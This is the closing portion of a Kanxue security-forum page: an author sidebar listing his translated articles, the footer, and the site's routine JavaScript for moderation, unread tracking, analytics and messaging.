									<span class="post_online_time" style="vertical-align: middle;"
										data-online_time="648300" data-desc=""
										onmouseenter="show_online_level(event)"></span>

								</div>
							</div>
						</div>
						<div class="row mx-0 my-4 text-center">
							<div class="col px-0">
								<div style="color: #0099ee; font-size: 16px;">
									<a href="https://bbs.kanxue.com/user-747240.htm" style="color: #0099ee;"
										target="_blank">
										14									</a>
								</div>
								<div class="small" style="color: #888888;">发帖</div>
							</div>
							<div class="col px-0">
								<div style="color: #0099ee; font-size: 16px;">
									<a href="https://bbs.kanxue.com/user-post-747240.htm" style="color: #0099ee;"
										target="_blank">
										17									</a>
								</div>
								<div class="small" style="color: #888888;">回帖</div>
							</div>
							<div class="col px-0">
								<div style="color: #0099ee; font-size: 16px;">
									<a href="https://bbs.kanxue.com/thread-260144.htm" style="color: #0099ee;"
										target="_blank">
										170									</a>
								</div>
								<div class="small" style="color: #888888;">RANK</div>
							</div>
						</div>
						<div class="px-1 row mx-0">
							<div class="col-6">
																<a class="btn btn-0099ee w-100 follow_btn py-1"
									data-cuid="747240">
									<i class="icon icon-plus"></i> 关注
								</a>
															</div>
							<div class="col-6">
								<a href="https://www.kanxue.com/pm-send.htm?name=hesir"
									class="btn bg-white w-100 py-1" style="border: 1px solid #0099ee; color:#0099ee;">
									<i class="icon-envelope"></i>
									私信
								</a>
							</div>

						</div>
					</div>
				</div>

				<div class="card mb-3 py-2 show_tocbot ">
					<div id="js-toc" class="js-toc"></div>
				</div>
			</div>
			<div class="card mb-3 pb-3" style="color: #bbbbbb;">
				<div class="py-2 px-3 mb-2" style="color: #333333;border-bottom: 1px solid #eeeeee;">
					他的文章
				</div>
				<div class="px-3">
										<div class="mb-2">
						<a href="https://bbs.kanxue.com/thread-226565.htm"
							style="color: #7d7d7d; font-size: 13px;">[翻译]使用 Bro IDS 和 Intel Critical Stack 分析网络活动</a>
						<i class="icon icon-eye small"> 6657</i>
					</div>
										<div class="mb-2">
						<a href="https://bbs.kanxue.com/thread-225613.htm"
							style="color: #7d7d7d; font-size: 13px;">[翻译]如何使用 OpenSSL 保护聊天安全？</a>
						<i class="icon icon-eye small"> 5226</i>
					</div>
										<div class="mb-2">
						<a href="https://bbs.kanxue.com/thread-224462.htm"
							style="color: #7d7d7d; font-size: 13px;">[翻译]漫谈C++游戏引擎开发</a>
						<i class="icon icon-eye small"> 7422</i>
					</div>
										<div class="mb-2">
						<a href="thread-222921.htm"
							style="color: #7d7d7d; font-size: 13px;">[翻译]XSLT 服务端注入攻击</a>
						<i class="icon icon-eye small"> 4469</i>
					</div>
										<div class="mb-2">
						<a href="https://bbs.kanxue.com/thread-221595.htm"
							style="color: #7d7d7d; font-size: 13px;">[翻译]如何挖掘漏洞？</a>
						<i class="icon icon-eye small"> 5428</i>
					</div>
					
				</div>
			</div>
						<div class="bg-white mb-3 position-relative">
				<a id="thread_ad" data-thread_postdata="2_19_15"
					data-href="https://bbs.pediy.com/thread-265424.htm" href="javascript:void(0);">
					<img src="https://www.kanxue.com/upload/attach/202102/202102021340_DX5RA3QXUFDGEAM.jpg" class="w-100" alt="">
					<span id="diff_day" class="position-absolute"
						style="bottom: 1.6rem; left: 5rem; font-size: 40px; color: #00dfff;"></span>
				</a>
			</div>
						<div class="card mb-3 px-2 py-3">
				<div class="row mx-0 text-center small pb-3" style="border-bottom: 1px solid #ececec;">
					<div class="col-4 px-0" style="border-right: 1px solid #ececec;"><a class="text-muted"
							href="https://zhuanlan.kanxue.com/article-56.htm">关于我们</a></div>
					<div class="col-4 px-0" style="border-right: 1px solid #ececec;"><a class="text-muted"
							href="https://www.kanxue.com/user-online_sendmsg.htm">联系我们</a></div>
					<div class="col-4 px-0"><a class="text-muted" href="https://qifu.kanxue.com/">企业服务</a></div>
				</div>
				<div class="pt-3 small">
					<img src="https://bbs.kanxue.com/view/img/gongzhonghao.png" style="max-width: 80px; float: left;" alt="">
					<div class="px-2 py-2 text-muted" style="overflow: hidden;">
						<div>看雪公众号</div>
						<div>专注于PC、移动、智能设备安全研究及逆向工程的开发者社区</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<!--谁下载-->


</div>

</main>


<div class="container px-0 pb-3">

<div class="row mx-0 bbs_footer_at_column hidden-sm hidden-md" style="text-align: center; height: 76px;">

    <div class="col-md-6 px-0" style="height: 100%;">

    <a href="https://bbs.kanxue.com/thread-275848.htm" style="height: 100%;" target="_blank">

    <!-- <p></p > -->

    <img src="https://www.kanxue.com/upload/attach/_202301311437_TFN5RV5DU4VPHMR.jpg" width="100%" height="100%">



    </a>

    </div>

    <div class="col-md-6 px-0" style="height: 100%;">

    <a href="https://www.kanxue.com/book-leaflet-83.htm" style="height: 100%;" target="_blank">

    <!-- <p></p > -->

    <img src="https://www.kanxue.com/upload/attach/_202211071314_TJXM7FJJ2AJJ4H6.jpg" width="100%" height="100%">

    </a>

    </div>

</div>

</div>



<footer id="footer" style="background: #3b4348; color: #9ba4aa; height: auto;">
	<div class="container">
		<div class="row text-muted small my-3 mx-0" id="web_base_company_information">
			<div class="col-12 col-md-6">
				©2000-2023 看雪 | Based on <a href="http://bbs.xiuno.com/" target="_blank"
					class="text-muted">Xiuno BBS</a><br>
				域名：<a href="https://www.yunaq.com/" target="_blank" class="text-muted">加速乐</a> |
				SSL证书：<a href="https://www.trustasia.com/trustasia" target="_blank" class="text-muted">亚洲诚信</a> |
				<a href="http://dun.163.com/?from=kanxue_DDoS_2018&amp;hmsr=kanxue" target="_blank"
					class="text-muted">安全网易易盾</a>

			</div>
			<div class="col-12 col-md-6 pt-2 pt-md-0 text-md-right">
				
				<span><a class="text-muted" href="https://ce.kanxue.com/project-test_read-538.htm">看雪SRC</a></span> |
				<span><a class="text-muted" href="https://bbs.kanxue.com/thread-260116.htm">看雪APP</a></span> |
				<span>公众号：ikanxue</span> |
				<a class="text-muted" href="https://zhuanlan.kanxue.com/article-56.htm">关于我们</a> |
				<a class="text-muted" href="https://www.kanxue.com/user-online_sendmsg.htm">联系我们</a> |
				<a href="https://zhuanlan.kanxue.com/article-1.htm" class="text-muted">企业服务</a> <br>
				Processed: <b>0.015</b>s, SQL:
				<b>17</b> / <a class="text-muted" href="http://beian.miit.gov.cn/"
					target="_blank">沪ICP备2022023406号-1</a> / <a class="text-muted" href="http://www.beian.gov.cn/portal/registerSystemInfo?domainname=%27pediy.com%27&amp;recordcode=31011502006611" target="_blank">沪公网安备 31011502006611号</a>

			</div>
		</div>
		<!-- <div style="max-height: 100px; overflow-y:auto;">
					</div> -->
	</div>
</footer>



<!--[if lt IE 9]>
	<script>window.location = 'browser.htm';</script>
	<![endif]-->




<div class="act_go_top"
	style="position: fixed; _position: absolute; bottom: 80px; right: 10px; z-index: 99; width: 70px; height: 70px; display: none;">
	<a href="javascript:;"
		style="width: 70px; height: 70px; display: inline-block;background: url(https://bbs.kanxue.com/view/img/scroll_top.png) no-repeat; _background: url(https://bbs.kanxue.com/view/img/scroll_top.png) no-repeat; outline: none;"
		title="返回顶部"></a>
</div>

</body>

</html>
<script src="https://bbs.kanxue.com/lang/zh-cn/bbs.js?1.5"></script>
<script src="https://bbs.kanxue.com/view/js/jquery-3.1.0.js?1.5"></script>
<script src="https://bbs.kanxue.com/view/js/popper.js?1.5"></script>
<script src="https://bbs.kanxue.com/view/js/bootstrap.js?1.5"></script>
<script src="https://bbs.kanxue.com/view/js/xiuno.js?1688105131"></script>
<script src="https://bbs.kanxue.com/view/js/storagePlus.js"></script>
<script src="https://www.kanxue.com/view/js/bootstrap-plugin.js?1.5"></script>
<script src="https://bbs.kanxue.com/view/js/async.js?1.5"></script>
<script src="https://bbs.kanxue.com/view/js/form.js?1.5"></script>

    <script src="https://passport.kanxue.com/xiunoui/js_md5.js"></script>
    <script src="https://cstaticdun.126.net/load.min.js"></script>
    <script src="https://www.kanxue.com/view/js_bs4_beta3/logininPlug.js"></script>
    <script>
        $(function(){
            $(".login_btn").on("click",function(){
                $(".kx_login_plugbox").show()
            })
        })
    </script>
    <script>
	// 用于个人中心 判断路由 center ，还是 pm
	var debug = DEBUG = 0;
	var url_rewrite_on = 1;
	var forumarr = {
    "177": "x64dbg插件区",
    "52": "OllyDbg插件区",
    "53": "IDA Pro插件区",
    "4": "软件逆向",
    "69": "经典问答",
    "102": "科锐培训",
    "141": "CrackMe存档区",
    "152": "学习园地",
    "2": "社区版务",
    "76": "1)珠海金山2007逆向分析挑战赛",
    "99": "《加密与解密(第4版)》",
    "169": "15PB培训",
    "125": "奇虎360软件安全大赛答案提交区",
    "21": "《软件加密技术内幕》",
    "68": "2)PEDIY Crackme竞赛2007",
    "41": "编程技术",
    "95": "《0day:软件漏洞分析技术》",
    "88": "加壳脱壳",
    "91": "3)2008 Exploit Me挑战赛",
    "158": "终端安全",
    "3": "PC安全（Windows/UNIX）",
    "120": "4)腾讯公司2008软件安全竞赛",
    "123": "《微软.NET程序的加密与解密》",
    "127": "5)奇虎360软件安全比赛",
    "37": "CTF对抗",
    "140": "6)PEDIY Crackme竞赛2009",
    "116": "CTF",
    "150": "二进制漏洞",
    "163": "《C++反汇编与逆向分析技术》",
    "108": "企业建设",
    "155": "7)腾讯公司2010软件安全竞赛",
    "168": "《Android安全与逆向分析》",
    "157": "8)2011 Exploit Me赛",
    "121": "9）移动安全挑战赛（MSC）",
    "129": "10）第2届移动安全挑战（MSC）",
    "136": "职场生活",
    "45": "茶余饭后",
    "97": "求助问答",
    "161": "Android安全",
    "1": "站务管理/产品",
    "10": "资源下载",
    "128": "智能设备",
    "151": "WEB安全",
    "162": "企业安全",
    "171": "Pwn",
    "20": "¥付费问答",
    "32": "外文翻译",
    "47": "招聘专区",
    "166": "iOS安全",
    "65": "图书项目",
    "137": "职业生涯",
    "174": "International  vision",
    "132": "密码应用",
    "172": "区块链安全",
    "173": "KSA软件",
    "178": "HarmonyOS"
};
	var fid = 32;
	var uid = 0;
	var gid = 0;
	$('[data-toggle="tooltip"]').tooltip();
	$('#search_form > input').on('click', function () {
		return false;
	});
</script>

<script src="https://bbs.kanxue.com/view/js/bbs.js?1.5"></script>

<script>
// 版主管理：精华
$('.mod-button button.digest').on('click', function() {
	var modtid = $('input[name="modtid"]').checked();
	if(modtid.length == 0) return $.alert(lang.please_choose_thread);
	var radios = xn.form_radio('digest', {"0": "取消精华", "1": "关注","2": "优秀", "3": "精华"});
	var radios2 = xn.form_radio('skill_type', {"0":"无", "7": "Reverse", "1": "PWN","2": "App", "3": "Web", "4": "IoT", "5":"Develop", "6":"MISC"});
	$.confirm("设置主题为精华", function() {
		var tids = xn.implode('_', modtid);
		var digest = $('input[name="digest"]').checked();
		var skill_type = $('input[name="skill_type"]').checked();
		var postdata = {digest: digest, skill_type:skill_type};
		
		$.xpost(xn.url('mod-digest-'+tids), postdata, function(code, message) {

			if(code != 0) return $.alert(message);
			// $.alert(message).delay(1000).location('');

			if(digest != 0){
				if(window.confirm('设置成功，是否入库?')){
					$.alert('请稍等文库打开中...');
					$('.chm_in').trigger('click');
				}else{
					location.reload();
				}
				// $.confirm("设置成功，是否入库", function() {
					
				// 	$.alert('设置成功，请稍等文库打开中...');

				// });
				// $.alert('设置成功，请稍等文库打开中...');
				// $('.chm_in').trigger('click');
			}else{
				$.alert(message).delay(1000).location('');
			}


		});
	}, {'body': '<p>'+"精华等级"+'：'+radios+'<br>技能方向：'+radios2+'</p>'});
})
</script><script>
function xn_read_unread(tids, tid) {
	
	// 当前时间
	var time = xn.time();
	
	// 多长时间内的主题为最新主题
	var time_range = 86400 * 3;
	
	// 三天内的 tids
	var recent_tids = $.pdata('recent_tids') || {};
	
	// 已读的 tids
	var view_tids = $.pdata('view_tids') || {};
	// 提取列表页的 tid
	function fetch_recent_tids(tids) {
		var changed = false;
		$.each(tids, function(tid, last_date) {
			if(time - last_date < time_range) {
				recent_tids[tid] = last_date;
				changed = true;
			}
		});
		if(changed) $.pdata('recent_tids', recent_tids);
	}
	
	// 清理最近的 tid
	function gc_recent_tids() {
		var changed = false;
		$.each(recent_tids, function(tid, last_date) {
			if(time - last_date > time_range) {
				delete recent_tids[tid];
				changed = true;
			}
		});
		if(changed) $.pdata('recent_tids', recent_tids);
	}
	
	function gc_view_tids() {
		var changed = false;
		$.each(view_tids, function(tid, last_date) {
			if(!recent_tids[tid]) {
				delete view_tids[tid];
				changed = true;
			}
		});
		if(changed) $.pdata('view_tids', view_tids);
	}
	
	function save_view_tid(tid) {
		if(!recent_tids[tid]) return;
		view_tids[tid] = time;
		$.pdata('view_tids', view_tids);
	}
	
	if(tids) {
		fetch_recent_tids(tids);
		gc_recent_tids();
		//gc_view_tids();
	}
	if(tid) save_view_tid(tid);
	
	// 三天内的主题标记为已读
	
	// 遍历主题列表，标记最近的，并且未读的为加粗

	$('.thread').each(function() {
		var jthis = $(this);
		var tid = jthis.attr('tid') || jthis.data('tid');
		if(recent_tids[tid] && recent_tids[tid] > xn.intval(view_tids[tid])) {
			//jthis.find('div.subject').addClass('font-weight-bold');
			jthis.find('div.subject').append('<span class="icon-new"></span>');
			jthis.find('span.icon-post-grey').removeClass('icon-post-grey').addClass('icon-post-blue');
		}
	});

	// 首页未读
	$('.bbs_home_page_row_div').each(function() {
		var jthis = $(this);
		var tid = jthis.attr('tid') || jthis.data('tid');
		if(recent_tids[tid] && recent_tids[tid] > xn.intval(view_tids[tid])) {
			jthis.find('span.icon-post-grey').removeClass('icon-post-grey').addClass('icon-post-blue');
		}
	});
	// 列表页未读
	// ···
	// ···
	// ···
}

</script>

<script type="text/javascript">
	$(function () {
		setTimeout(function () {
			$.require('https://www.google-analytics.com/ga.js', function () {
				try {
					var pageTracker = _gat._getTracker("UA-9784446-1");
					pageTracker._trackPageview();
				} catch (err) {}
			});
		}, 1000);

		setTimeout(function () {
			$(".bbs_home_page_three_col .small_logo").each(function (index, element) {

				if ($(element).children("a").length == 0) {
					$(".bbs_home_page_three_col .bbs_home_page_row_div").eq(index).children(
						'div:first-child').removeClass("col-lg-8").addClass("col-lg-9");
					$(".bbs_home_page_three_col .bbs_home_page_row_div").eq(index).children(
						'div:last-child').removeClass("col-lg-4").addClass("col-lg-3");
					$(".bbs_home_page_three_col .bbs_home_page_row_div").eq(index).children(
						'div:first-child').children("span").css("width", "19rem");
				}
			})
		}, 2000);


		if (self != top) {
			$('#header').hide();
			$('#nav2').hide();
			$('#footer').hide();
		}


		// 导航
		var browser_width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
		if (browser_width <= 992) {
			var new_p = 0,
				start_scrollTop = 0;
			$(window).scroll(function (e) {
				new_p = $(this).scrollTop();

				if (start_scrollTop < new_p) { //下滚  
					$('.header_fiexd').css("display", "none");
				} else { //上滚  
					$('.header_fiexd').css("display", "block");
				}
				setTimeout(function () {
					start_scrollTop = new_p;
				}, 0);
			});
		}


		// 返回顶部
		$(window).scroll(function () {
			if ($(window).scrollTop() >= 500) {
				$('.act_go_top').fadeIn(300);
			} else {
				$('.act_go_top').fadeOut(300);
			}
		});

		$('.act_go_top').click(function () {
			$('html,body').animate({
				scrollTop: '0px'
			}, 100);
		});
		// var m1 = 0;     // 滚动的值
		// var m2 = 0;     // 对比时间的值
		// var timer = null;
		// document.onscroll = function() {
		// 	clearTimeout(timer) // 每次滚动前 清除一次
		// 	timer = setTimeout(Data, 2000);
		// 	m1 = document.documentElement.scrollTop || document.body.scrollTop;

		// }
		// function Data() {
		// 	m2 = document.documentElement.scrollTop || document.body.scrollTop;
		// 	if(m2 == m1){
		// 	    $('.act_go_top').fadeOut(300);
		// 	}
		// }

		// 3600000
		var d = new Date();
		var session_interval = d.getTime() - $.pdata('top-banner-session');

		if (session_interval > 3600000) {
			$.pdata('top-banner', 0);
		}
		if ($.pdata('top-banner') == 1) {
			$(".top-banner").hide();
		} else {
			$(".top-banner").slideDown();
		}
		$(".top-banner-section .closeBanner").on("click", function () {

			$.pdata('top-banner', 1);
			$.pdata('top-banner-session', d.getTime());
			$(".top-banner").animate({
				height: '0'
			})
		})


		// 退出登录
		$.xgpost = function (url, postdata, callback, progress_callback) {
			if ($.isFunction(postdata)) {
				callback = postdata;
				postdata = null;
			}
			$.ajax({
				type: 'POST',
				url: url,
				data: postdata,
				dataType: 'text',
				timeout: 6000000,
				xhrFields: {
					withCredentials: true
				},
				progress: function (e) {
					if (e.lengthComputable) {
						if (progress_callback) progress_callback(e.loaded / e.total * 100);
						//console.log('progress1:'+e.loaded / e.total * 100 + '%');
					}
				},
				success: function (r) {
					if (!r) return callback(-1, 'Server Response Empty!');
					var s = xn.json_decode(r);
					if (!s || s.code === undefined) return callback(-1,
						'Server Response Not JSON：' + r);
					if (s.code == 0) {
						return callback(0, s.message);
						//系统错误
					} else if (s.code < 0) {
						return callback(s.code, s.message);
					} else {
						return callback(s.code, s.message);
					}
				},
				error: function (xhr, type) {
					if (type != 'abort' && type != 'error' || xhr.status == 403) {
						return callback(-1000, "xhr.responseText:" + xhr.responseText + ', type:' +
							type);
					} else {
						return callback(-1001, "xhr.responseText:" + xhr.responseText + ', type:' +
							type);
						console.log("xhr.responseText:" + xhr.responseText + ', type:' + type);
					}
				}
			});
		};
		$('.nav_user_item .logout').click(function () {
			$.xpost('/user-logout.htm', {}, function (code, message) {
				if (code == 0) {
					$.msg(message);
					$.xgpost('//passport.kanxue.com/user-logout.htm', "", function (code, message) {

						setTimeout(function () {
							location.reload();
						}, 800)

					})
				}
			})
		});
	});
</script>

<script>
	(function () {
		var islogin = '0';
		if (islogin == 0) return;
		var pm_number = "/user-newpm.htm";
		$.xget(pm_number, function (code, message) {
			var pm_number = $(".pm_number");
			var sysm_number = $(".system_message_number");
			if (code == 0) {
				var newpms = parseInt(message.newpms);
				var system_pms = parseInt(message.system_pms);
				var pm_total = newpms + system_pms;
				if (pm_total != 0) {
					pm_total = pm_total > 99 ? "99+" : pm_total;
					if (newpms != 0) {
						$(".pm_message_btn").css("color", "#f44336");
					} else if (newpms == 0 && system_pms > 0) {
						$(".pm_message_btn").css("color", "#0099ee");

					}
					$(".newpms").html(newpms);
					$(".system_pms").html(system_pms);

					$(".pm_totals").html(pm_total);
				} else {
					// $(".pm_total_a").css("display","none");
				};
				if (message.newpms != 0) {
					pm_number.html(message.newpms);
					pm_number.addClass("pmmessage_number");
				} else {
					pm_number.css("display", "none");
				};
				if (message.system_pms != 0) {
					sysm_number.html(message.system_pms);
					sysm_number.addClass("pmmessage_number");
				} else {
					sysm_number.css("display", "none");
				};
				if (message.newpms != 0) {
					pm_number.html(message.newpms);
					pm_number.addClass("pm_numbers_");
				} else {
					pm_number.css("display", "none");
				};
				if (message.system_pms != 0) {
					sysm_number.html(message.system_pms);
					sysm_number.addClass("pm_numbers_");
				} else {
					sysm_number.css("display", "none");
				};


			} else {

				pm_number.css("display", "none");
				sysm_number.css("display", "none");

			}
		})

		$(".pm_message_box").on("mouseenter", function () {
			$(this).find(".dropdown-menu").addClass("show");
			$(this).addClass("active");
		})
		$(".pm_message_box").on("mouseleave", function () {
			$(this).find(".dropdown-menu").removeClass("show");
			$(this).removeClass("active");
		})

	})(jQuery);
</script>
<script>
	//统计在线
	(function () {
		var uid = '0';
		var current_time = '1688105131';
		var last_time;
		if (uid > 0) {
			//10分钟以内不请求。
			last_time = storagePlus.get('last_active_time_' + uid) || 0;
			//大于5分钟请求接口。
			if ((current_time - last_time) / 60 > 5) {
				$.xpost('user-online_sumtime.htm', {}, function (code, msg) {
					if (code == 0) {
						storagePlus.set('last_active_time_' + uid, msg);
					} else {
						console.info('msg');
					}
				});
			}
		}



	})();
</script>
<!-- vip -->
<script>
    $(function(){
        var www_domain = 'www.kanxue.com'
        var uidNewArray = [];
        $(".avatar_box").each(function(e){
			var uidIsHas = uidNewArray.indexOf($(this).data('uid'));
			if(uidIsHas == -1) {
				uidNewArray.push($(this).data('uid'));
			}
        })

        if(uidNewArray.length > 0) {
            $.xpost('//'+www_domain+'/member-is_vip.htm',{'uids':uidNewArray.toString()},function(code,message){
                if(code == 0) {

                    message.forEach(function(item, index){
                        if(item.is_vip != 0) {
                            $(".avatar_box[data-uid="+item.uid+"]").addClass("isVipX isVip"+item.is_vip)
                            $(".username_box[data-uid="+item.uid+"]").addClass("isVipColor")
                        }
                    })
                }
            })
        }
        
    })
</script>
<script>

var forumlist = [
    {
        "fid": "177",
        "fup": "10",
        "name": "x64dbg插件区",
        "rank": "40"
    },
    {
        "fid": "52",
        "fup": "10",
        "name": "OllyDbg插件区",
        "rank": "39"
    },
    {
        "fid": "53",
        "fup": "10",
        "name": "IDA Pro插件区",
        "rank": "38"
    },
    {
        "fid": "4",
        "fup": "3",
        "name": "软件逆向",
        "rank": "29"
    },
    {
        "fid": "29",
        "fup": "2",
        "name": "版主团队",
        "rank": "29"
    },
    {
        "fid": "69",
        "fup": "20",
        "name": "经典问答",
        "rank": "29"
    },
    {
        "fid": "122",
        "fup": "37",
        "name": "KCTF2023提交区(隐藏版块)",
        "rank": "29"
    },
    {
        "fid": "102",
        "fup": "137",
        "name": "科锐培训",
        "rank": "29"
    },
    {
        "fid": "141",
        "fup": "140",
        "name": "CrackMe存档区",
        "rank": "29"
    },
    {
        "fid": "152",
        "fup": "0",
        "name": "学习园地",
        "rank": "29"
    },
    {
        "fid": "2",
        "fup": "1",
        "name": "社区版务",
        "rank": "28"
    },
    {
        "fid": "76",
        "fup": "37",
        "name": "1)珠海金山2007逆向分析挑战赛",
        "rank": "28"
    },
    {
        "fid": "99",
        "fup": "65",
        "name": "《加密与解密(第4版)》",
        "rank": "28"
    },
    {
        "fid": "169",
        "fup": "137",
        "name": "15PB培训",
        "rank": "28"
    },
    {
        "fid": "125",
        "fup": "127",
        "name": "奇虎360软件安全大赛答案提交区",
        "rank": "28"
    },
    {
        "fid": "21",
        "fup": "57",
        "name": "《软件加密技术内幕》",
        "rank": "27"
    },
    {
        "fid": "68",
        "fup": "37",
        "name": "2)PEDIY Crackme竞赛2007",
        "rank": "27"
    },
    {
        "fid": "41",
        "fup": "3",
        "name": "编程技术",
        "rank": "27"
    },
    {
        "fid": "79",
        "fup": "57",
        "name": "前沿科技2",
        "rank": "27"
    },
    {
        "fid": "78",
        "fup": "2",
        "name": "申请提交区(隐藏版块)",
        "rank": "27"
    },
    {
        "fid": "95",
        "fup": "65",
        "name": "《0day:软件漏洞分析技术》",
        "rank": "27"
    },
    {
        "fid": "88",
        "fup": "3",
        "name": "加壳脱壳",
        "rank": "26"
    },
    {
        "fid": "91",
        "fup": "37",
        "name": "3)2008 Exploit Me挑战赛",
        "rank": "26"
    },
    {
        "fid": "158",
        "fup": "0",
        "name": "终端安全",
        "rank": "26"
    },
    {
        "fid": "3",
        "fup": "0",
        "name": "PC安全（Windows/UNIX）",
        "rank": "25"
    },
    {
        "fid": "120",
        "fup": "37",
        "name": "4)腾讯公司2008软件安全竞赛",
        "rank": "25"
    },
    {
        "fid": "57",
        "fup": "2",
        "name": "回收站",
        "rank": "25"
    },
    {
        "fid": "123",
        "fup": "57",
        "name": "《微软.NET程序的加密与解密》",
        "rank": "24"
    },
    {
        "fid": "127",
        "fup": "37",
        "name": "5)奇虎360软件安全比赛",
        "rank": "24"
    },
    {
        "fid": "37",
        "fup": "116",
        "name": "CTF对抗",
        "rank": "23"
    },
    {
        "fid": "140",
        "fup": "37",
        "name": "6)PEDIY Crackme竞赛2009",
        "rank": "23"
    },
    {
        "fid": "116",
        "fup": "0",
        "name": "CTF",
        "rank": "22"
    },
    {
        "fid": "150",
        "fup": "3",
        "name": "二进制漏洞",
        "rank": "22"
    },
    {
        "fid": "163",
        "fup": "65",
        "name": "《C++反汇编与逆向分析技术》",
        "rank": "22"
    },
    {
        "fid": "108",
        "fup": "0",
        "name": "企业建设",
        "rank": "21"
    },
    {
        "fid": "155",
        "fup": "37",
        "name": "7)腾讯公司2010软件安全竞赛",
        "rank": "21"
    },
    {
        "fid": "168",
        "fup": "65",
        "name": "《Android安全与逆向分析》",
        "rank": "21"
    },
    {
        "fid": "157",
        "fup": "37",
        "name": "8)2011 Exploit Me赛",
        "rank": "20"
    },
    {
        "fid": "121",
        "fup": "37",
        "name": "9）移动安全挑战赛（MSC）",
        "rank": "18"
    },
    {
        "fid": "129",
        "fup": "37",
        "name": "10）第2届移动安全挑战（MSC）",
        "rank": "17"
    },
    {
        "fid": "136",
        "fup": "0",
        "name": "职场生活",
        "rank": "12"
    },
    {
        "fid": "45",
        "fup": "136",
        "name": "茶余饭后",
        "rank": "6"
    },
    {
        "fid": "175",
        "fup": "137",
        "name": "《二万班安卓高级研修》",
        "rank": "5"
    },
    {
        "fid": "97",
        "fup": "152",
        "name": "求助问答",
        "rank": "4"
    },
    {
        "fid": "161",
        "fup": "158",
        "name": "Android安全",
        "rank": "4"
    },
    {
        "fid": "1",
        "fup": "0",
        "name": "站务管理/产品",
        "rank": "3"
    },
    {
        "fid": "10",
        "fup": "152",
        "name": "资源下载",
        "rank": "3"
    },
    {
        "fid": "128",
        "fup": "158",
        "name": "智能设备",
        "rank": "3"
    },
    {
        "fid": "151",
        "fup": "108",
        "name": "WEB安全",
        "rank": "3"
    },
    {
        "fid": "160",
        "fup": "78",
        "name": "麦洛科菲培训",
        "rank": "3"
    },
    {
        "fid": "162",
        "fup": "108",
        "name": "企业安全",
        "rank": "3"
    },
    {
        "fid": "176",
        "fup": "137",
        "name": "《三万班安卓高级研修》",
        "rank": "3"
    },
    {
        "fid": "171",
        "fup": "116",
        "name": "Pwn",
        "rank": "2"
    },
    {
        "fid": "20",
        "fup": "152",
        "name": "¥付费问答",
        "rank": "2"
    },
    {
        "fid": "32",
        "fup": "10",
        "name": "外文翻译",
        "rank": "2"
    },
    {
        "fid": "47",
        "fup": "108",
        "name": "招聘专区",
        "rank": "2"
    },
    {
        "fid": "166",
        "fup": "158",
        "name": "iOS安全",
        "rank": "2"
    },
    {
        "fid": "170",
        "fup": "57",
        "name": "看雪产品",
        "rank": "2"
    },
    {
        "fid": "64",
        "fup": "152",
        "name": "会员专区",
        "rank": "1"
    },
    {
        "fid": "65",
        "fup": "136",
        "name": "图书项目",
        "rank": "1"
    },
    {
        "fid": "137",
        "fup": "108",
        "name": "职业生涯",
        "rank": "1"
    },
    {
        "fid": "174",
        "fup": "32",
        "name": "International  vision",
        "rank": "1"
    },
    {
        "fid": "132",
        "fup": "158",
        "name": "密码应用",
        "rank": "0"
    },
    {
        "fid": "172",
        "fup": "78",
        "name": "区块链安全",
        "rank": "0"
    },
    {
        "fid": "173",
        "fup": "1",
        "name": "KSA软件",
        "rank": "0"
    },
    {
        "fid": "178",
        "fup": "78",
        "name": "HarmonyOS",
        "rank": "0"
    }
];

// 三级版块
function forum_tree(forumlist, template) {
	var template = template || '<option value="{fid}">{tab}{name}</option>'+"\r\n";
	var s = '';
	var forumlist1 = forumlist.filter(function(v) {return v.fup == 0});
	for(var i1=0; i1<forumlist1.length; i1++) {
		var v1 = forumlist1[i1];
		s += '►'+xn.template(template, {fid: v1.fid, name: v1.name, tab: "　"});
		var forumlist2 = forumlist.filter(function(v2) {return v2.fup == v1.fid});
		for(var i2=0; i2<forumlist2.length; i2++) {
			var v2 = forumlist2[i2];
			s += xn.template(template, {fid: v2.fid, name: v2.name, tab: "　　"});
			var forumlist3 = forumlist.filter(function(v3) {return v3.fup == v2.fid});
			for(var i3=0; i3<forumlist3.length; i3++) {
				var v3 = forumlist3[i3];
				s += xn.template(template, {fid: v3.fid, name: v3.name, tab: "　　　　"});
			}

		}
	}
	return s;
}


// 版主管理：移动 / moderator : move
$('.mod-button button.move').off('click').on('click', function() {
	var modtid = $('input[name="modtid"]').checked();
	if(modtid.length == 0) return $.alert(lang.please_choose_thread);
	var select = '<select name="fid">'+forum_tree(forumlist)+'</select>';
	$.confirm(lang.move_forum, function() {
		var tids = xn.implode('_', modtid);
		var newfid = $('select[name="fid"]').val();
		$.xpost(xn.url('mod-move-'+tids+'-'+newfid), function(code, message) {
			if(code != 0) return $.alert(message);
			$.alert(message).delay(1000).location('');
		});
	}, {'body': '<p>'+lang.choose_move_forum+'：'+select+'</p>'});
})

</script><script>

// 版主管理：审核
$('.mod-button button.audit').on('click', function() {
	var modtid = $('input[name="modtid"]').checked();
	if(modtid.length == 0) return $.alert(lang.please_choose_thread);
	var radios = xn.form_radio('audit', {"1": "审核通过", "2": "审核不通过"});
	$.confirm('审核主题', function() {
		var tids = xn.implode('_', modtid);
		var audit = $('input[name="audit"]').checked();
		var postdata = {audit: audit};
		$.xpost(xn.url('mod-audit-'+tids), postdata, function(code, message) {
			if(code != 0) return $.alert(message);
			$.alert(message).delay(1000).location('');
		});
	}, {'body': '<p>'+'审核选项'+'：'+radios+'</p>'});
})

</script><script>

    // 版主管理：审核
    $('.mod-button button.limit').on('click', function() {
        var modtid = $('input[name="modtid"]').checked();
        if(modtid.length == 0) return $.alert(lang.please_choose_thread);
        var radios = xn.form_radio('limit', {"0": "验证通过", "1": "待验证"});
        $.confirm('验证主题', function() {
            var tids = xn.implode('_', modtid);
            var limit = $('input[name="limit"]').checked();
            var postdata = {audit: limit};
            $.xpost(xn.url('mod-newuser_audit-'+tids), postdata, function(code, message) {
                if(code != 0) return $.alert(message);
                $.alert(message).delay(1000).location('');
            });
        }, {'body': '<p>'+'验证选项'+'：'+radios+'</p>'});
    })
    
    </script>



<script>

$(function() {
	// 版主管理：删除 / moderator : delete
	$('.mod-button button.delete').off('click').on('click', function() {
		var modtid = $('input[name="modtid"]').checked();
		if(modtid.length == 0) return $.alert(lang.please_choose_thread);
		var radios = '';
				//var htmladd = '<br><br><label class="text-small"><input type="checkbox" name="logic" value="0" /> 物理删除</label>';
		//htmladd += '<br><label class="text-small"><input type="checkbox" name="logic" value="0" /> 恢复删除</label>';
